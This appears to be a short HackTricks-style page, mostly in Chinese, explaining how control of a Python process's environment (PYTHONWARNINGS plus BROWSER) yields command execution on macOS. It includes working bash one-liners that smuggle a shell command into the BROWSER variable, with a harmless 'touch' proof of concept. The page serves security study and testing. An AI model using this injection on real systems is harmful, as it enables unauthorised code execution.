# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## 通过 `PYTHONWARNINGS` 和 `BROWSER` 环境变量

如果攻击者能够控制 Python 进程的环境，那么在 Python 处理构造的警告选项并导入 `antigravity` 模块时，`PYTHONWARNINGS` 和 `BROWSER` 的组合可以触发命令执行。该技术依赖 `antigravity` 使用 Python 的 `webbrowser` 模块打开 URL，而该模块会遵循 `BROWSER` 环境变量。<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [使用环境变量进行 Hacking - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
